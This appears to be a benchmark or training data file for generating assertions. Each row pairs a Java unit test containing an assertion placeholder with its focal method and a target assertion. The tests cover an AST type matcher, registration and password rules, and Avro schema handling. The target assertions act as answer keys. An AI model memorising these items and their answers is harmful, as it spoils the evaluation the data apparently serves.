matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testTypeMatcherForClassExtendingClassWhichImplementsInterfaceWhichExtendsInterface() {  String child = ""package x;\r\n"" + ""import org.alfasoftware.astra.exampleTypes.A;\r\n"" + ""public class G extends A {}"";  Matcher matcher = TypeMatcher.builder().asClass().implementingInterfaces(new HashSet<>(Arrays.asList(BaseFooable.class.getName()))).build();  ClassVisitor visitor = parse(child); List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testTypeMatcherForChildClassExtendingParentClassWhichExtendsGrandparentClass() {  String child = ""package x;\r\n"" + ""import org.alfasoftware.astra.exampleTypes.G;\r\n"" + ""public class H extends G {}"";  Matcher matcher = TypeMatcher.builder().asClass().extending(A.class.getName()).build();  ClassVisitor visitor = parse(child); List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testClassWithSingleSimpleAnnotation() { // Given String annotatedClass = ""package x;"" + ""import org.alfasoftware.astra.exampleTypes.AnnotationA;"" + ""@AnnotationA "" + ""public class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .withAnnotation() .withFullyQualifiedName(""org.alfasoftware.astra.exampleTypes.AnnotationA"").endTypeAnnotation() .build();  // When ClassVisitor visitor = parse(annotatedClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testClassWithThreeAnnotations() { // Given String annotatedClass = ""package x;\r\n"" + ""@Annotation\r\n"" + ""@Annotation2(3)\r\n"" + ""@Annotation3(marker=""test"")\r\n"" + ""public class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .withAnnotation().withFullyQualifiedName(""Annotation"").endTypeAnnotation() .withAnnotation().withFullyQualifiedName(""Annotation2"").withValue(3).endTypeAnnotation() .withAnnotation().withFullyQualifiedName(""Annotation3"").withWithMemberAndValue(""marker"", ""test"").endTypeAnnotation() .build();  // When ClassVisitor visitor = parse(annotatedClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testClassWithSingleAnnotation() { // Given String annotatedClass = ""package x;\r\n"" + ""import org.alfa.Annotation;\r\n"" + ""@Annotation(marker=3)\r\n"" + ""public class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .withAnnotation() .withFullyQualifiedName(""Annotation"").withWithMemberAndValue(""marker"", 3).endTypeAnnotation() .build();  // When ClassVisitor visitor = parse(annotatedClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testClassWithMissingSingleAnnotation() { // Given String annotatedClass = ""package x;\r\n"" + ""import org.alfa.Annotation;\r\n"" + ""@Annotation(marker=3)\r\n"" + ""public class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .withAnnotation() .withFullyQualifiedName(""Annotation2"").withWithMemberAndValue(""marker"", 3).endTypeAnnotation() .build();  // When ClassVisitor visitor = parse(annotatedClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertFalse(matcher.matches(typeDeclarations.get(0)))
"testClassVisibilityIsPublic() { // Given String publicClass = ""package x;"" + ""public class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .withPublicVisibility() .build();  // When ClassVisitor visitor = parse(publicClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testClassVisibilityIsPublicWhenItIsNot() { // Given String publicClass = ""package x;"" + ""class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .withPublicVisibility() .build();  // When ClassVisitor visitor = parse(publicClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertFalse(matcher.matches(typeDeclarations.get(0)))
"testClassVisibilityIsPrivate() { // Given String publicClass = ""package x;"" + ""private class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .withPrivateVisibility() .build();  // When ClassVisitor visitor = parse(publicClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testClassVisibilityIsPrivateWhenItIsNot() { // Given String publicClass = ""package x;"" + ""class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .withPrivateVisibility() .build();  // When ClassVisitor visitor = parse(publicClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertFalse(matcher.matches(typeDeclarations.get(0)))
"testClassVisibilityIsPackage() { // Given String publicClass = ""package x;"" + ""class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .withPackageVisibility() .build();  // When ClassVisitor visitor = parse(publicClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testClassVisibilityIsPackageWhenItIsNot() { // Given String publicClass = ""package x;"" + ""public class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .withPackageVisibility() .build();  // When ClassVisitor visitor = parse(publicClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertFalse(matcher.matches(typeDeclarations.get(0)))
"testClassIsStatic() { // Given String staticClass = ""package x;"" + ""public static class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .isStatic() .build();  // When ClassVisitor visitor = parse(staticClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testClassIsStaticWhenItIsNot() { // Given String staticClass = ""package x;"" + ""public class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .isStatic() .build();  // When ClassVisitor visitor = parse(staticClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertFalse(matcher.matches(typeDeclarations.get(0)))
"testClassIsAbstract() { // Given String staticClass = ""package x;"" + ""public abstract class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .isAbstract() .build();  // When ClassVisitor visitor = parse(staticClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testClassIsAbstractWhenItIsNot() { // Given String staticClass = ""package x;"" + ""public class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .isAbstract() .build();  // When ClassVisitor visitor = parse(staticClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertFalse(matcher.matches(typeDeclarations.get(0)))
"testClassIsFinal() { // Given String staticClass = ""package x;"" + ""public final class y {}""; Matcher matcher = TypeMatcher.builder() .asClass() .isFinal() .build();  // When ClassVisitor visitor = parse(staticClass);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testComplexMatchOnManyCriteria() { // Given String complexTest = ""package x;\r\n"" + ""import java.util.List;\r\n"" + ""import org.alfasoftware.astra.exampleTypes.AnnotationA;\r\n"" + ""\r\n"" + ""@AnnotationA(test=""a"")\r\n"" + ""public abstract static class SimpleTest3141 extends org.alfasoftware.astra.exampleTypes.B implements List, org.alfasoftware.astra.exampleTypes.ExampleMarkerInterface {}""; Matcher matcher = TypeMatcher.builder() .asClass() .withNameLike(""x.SimpleTest\\d{4}"") .isAbstract() .isStatic() .extending(""org.alfasoftware.astra.exampleTypes.B"") .implementingInterfaces(new HashSet<>(Arrays.asList(""java.util.List"", ""org.alfasoftware.astra.exampleTypes.ExampleMarkerInterface""))) .withAnnotation().withFullyQualifiedName(""org.alfasoftware.astra.exampleTypes.AnnotationA"").withWithMemberAndValue(""test"", ""a"").endTypeAnnotation() .build();  // When ClassVisitor visitor = parse(complexTest);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testTypeMatcherExtendingWhereNoSupertypePresent() { // Given String extendsMatcher = ""package x;\r\n"" + ""public class Y{}"";  Matcher parameterizedTypeMatcher = TypeMatcher.builder() .extending(""java.util.List"") .build();  // When ClassVisitor visitor = parse(extendsMatcher);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertFalse(parameterizedTypeMatcher.matches(typeDeclarations.get(0)))
"checkPrefix() { StorageVolumeItem storageVolumeItem = new StorageVolumeItem(""vol1"", ""/home/vol1""); String name = storageVolumeItem.getStylishName(); ""<AssertPlaceHolder>""; }
getStylishName() { return PREFIX + super.getName(); }"	assertEquals(name, StorageVolumeItem.PREFIX + storageVolumeItem.getName())
"testRuleIsBroken() { UserRegistration userRegistration = new UserRegistration(); userRegistration.setRecoveryCodeExpirationDate(LocalDateTime.now().plusSeconds(60)); userRegistration.setRecoveryCode(""123"");  ""<AssertPlaceHolder>""; }
isRuleComplied() { return userRegistration.isRecoveryCodeExpired() || userRegistration.getRecoveryCode() == null; }"	assertFalse((new PasswordRecoveryCodeShouldBeExpiredOrNull(userRegistration)).isRuleComplied())
"testRuleIsNotBroken() { UserRegistration userRegistration = new UserRegistration(); userRegistration.setRecoveryCodeExpirationDate(LocalDateTime.now().plusSeconds(60)); ""<AssertPlaceHolder>""; }
isRuleComplied() { return userRegistration.isRecoveryCodeUnexpired(); }"	assertTrue((new PasswordRecoveryCodeShouldNotExpired(userRegistration)).isRuleComplied())
"testRuleIsNotBroken() { ""<AssertPlaceHolder>""; }
isRuleComplied() { return providedPassoword.equals(storedPassword); }"	"assertTrue((new PasswordsMustMatch(""abc"", ""abc"")).isRuleComplied())"
"testRuleIsBroken() { ""<AssertPlaceHolder>""; }
isRuleComplied() { return providedPassoword.equals(storedPassword); }"	"assertFalse((new PasswordsMustMatch(""abc1"", ""abc"")).isRuleComplied())"
"testRuleIsNotBroken() { ""<AssertPlaceHolder>""; }
isRuleComplied() { return providedCode.equals(storedCode); }"	"assertTrue((new RecoveryCodeMustMatch(""abc"", ""abc"")).isRuleComplied())"
"testRuleIsBroken() { ""<AssertPlaceHolder>""; }
isRuleComplied() { return providedCode.equals(storedCode); }"	"assertFalse((new RecoveryCodeMustMatch(""abc1"", ""abc"")).isRuleComplied())"
"testRuleIsBroken() { LocalDateTime registerDate1 = LocalDateTime.now().minusDays(CONFIRMATION_LINK_DURATION); ""<AssertPlaceHolder>""; }
isRuleComplied() { return LocalDateTime.now().isBefore(this.registerDate.plusDays(CONFIRMATION_LINK_DURATION)); }"	assertFalse((new UserRegistrationCannotBeConfirmedAfterExpiration(registerDate1)).isRuleComplied())
"testRuleIsBroken() { ""<AssertPlaceHolder>""; }
isRuleComplied() { return !this.status.equals(UserRegistrationStatus.Confirmed); }"	assertFalse((new UserRegistrationCannotBeConfirmedMoreThanOnce(UserRegistrationStatus.Confirmed)).isRuleComplied())
"testRuleIsNotBroken() { ""<AssertPlaceHolder>""; }
isRuleComplied() { return userRegistrationStatus.equals(UserRegistrationStatus.Confirmed); }"	assertTrue((new UserRegistrationMustBeConfirmed(UserRegistrationStatus.Confirmed)).isRuleComplied())
"testRuleIsNotBroken() { when(repository.countByEmailAndStatus(any(), any())).thenReturn(0L); ""<AssertPlaceHolder>""; }
isRuleComplied() { return repository.countByEmailAndStatus(email, UserRegistrationStatus.Confirmed) < 1; }"	"assertTrue((new UserRegistrationMustBeUnique(repository, """")).isRuleComplied())"
"testRuleIsBroken() { when(repository.countByEmailAndStatus(any(), any())).thenReturn(1L); ""<AssertPlaceHolder>""; }
isRuleComplied() { return repository.countByEmailAndStatus(email, UserRegistrationStatus.Confirmed) < 1; }"	"assertFalse((new UserRegistrationMustBeUnique(repository, """")).isRuleComplied())"
"testRuleIsBroken() { Session session1 = new Session(); session1.setExpirationDate(LocalDateTime.now().minusDays(2));  ""<AssertPlaceHolder>""; }
isRuleComplied() { return (!session.isExpired()) || (session.isExpired() && session.getRefreshToken() != null); }"	assertFalse((new SessionCannotBeExpiredWhenRefreshTokenIsMissing(session1)).isRuleComplied())
"testRuleIsNotBroken() { when(repository.findByEmail(any())).thenReturn(null); ""<AssertPlaceHolder>""; }
isRuleComplied() { return userRespository.findByEmail(this.email) == null; }"	"assertTrue((new UserEmailMustBeUnique(repository, ""random@email.com"")).isRuleComplied())"
"testRuleIsBroken() { when(repository.findByEmail(any())).thenReturn(new User()); ""<AssertPlaceHolder>""; }
isRuleComplied() { return userRespository.findByEmail(this.email) == null; }"	"assertFalse((new UserEmailMustBeUnique(repository, ""random@email.com"")).isRuleComplied())"
"build_usesSystemClockUtc() { ""<AssertPlaceHolder>""; }
getClock() { return clock; }"	"assertThat( withOriginalSchema( TestResourceLoader.classPath() .forAvro() .asSchema(""avro_records/union_with_array_schema.json"")) .withEncryptColumnKeys(DUMMY_ENCRYPT_COLUMN) .getClock()) .isEqualTo(Clock.systemUTC())"
"updatedSchema_valid() { Schema updatedSchema = withOriginalSchema(inputSchema) .withEncryptColumnKeys(encryptColumnNames) .withClock(fixedTestClock) .updatedSchema();  JsonSubject.""<AssertPlaceHolder>""; }
updatedSchema() { checkState( originalSchema != null && encryptColumnSchemaKeys != null && !encryptColumnSchemaKeys.isEmpty(), ""schema and encrypt columns can't be null or empty"");  var updatedRecordDoc = String.format( ""%s%n%s %s"", originalSchema.getDoc(), ""Updated for encryption at"", DateTimeFormatter.ISO_INSTANT.format(clock.instant())); return makeRecord( recordBuilder(originalSchema).doc(updatedRecordDoc), originalSchema, ROOT_SYMBOL); }"	assertThat(updatedSchema).isEqualTo(expectedSchema)
"convert_valid() { GenericRecord testRecord = TestResourceLoader.classPath() .forAvro() .withSchemaFile(avroSchemaJsonFile) .loadRecord(avroRecordJsonFile);  FlatRecord flatRecord = new GenericRecordFlattener().flatten(testRecord);  ""<AssertPlaceHolder>""; }
flatten(GenericRecord genericRecord) { return new TypeFlattener(genericRecord).convert(); }"	assertThat(flatRecord) .isEqualTo( TestResourceLoader.classPath() .forProto(FlatRecord.class) .loadText(expectedFlatRecordFile))
"asJsonString_valid() { var jsonValue = JsonConvertor.asJsonString(input); logger.atInfo().log(""jsonValue: %s"", jsonValue); JsonSubject.""<AssertPlaceHolder>""; }
